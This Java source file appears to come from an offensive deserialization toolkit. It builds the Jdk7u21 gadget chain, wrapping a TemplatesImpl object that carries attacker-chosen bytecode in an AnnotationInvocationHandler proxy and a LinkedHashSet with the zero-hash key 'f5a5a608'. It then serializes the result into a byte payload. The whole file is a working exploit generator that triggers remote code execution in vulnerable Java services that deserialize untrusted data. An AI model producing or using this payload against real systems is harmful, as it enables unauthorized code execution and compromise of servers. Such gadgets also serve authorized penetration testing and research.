package com.aurora.Gadgets;



import com.aurora.Gadgets.utils.Gadgets;
import com.aurora.Gadgets.utils.Reflections;
import com.aurora.SupportType.PayloadType;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

public class Jdk7u21 {

    public static Object getObject(PayloadType type, String... param) throws Exception{
        final Object templates = Gadgets.createTemplatesImpl(type, param);

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object
        return set;
    }
    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        Object set = getObject(type,param);
        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(set);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}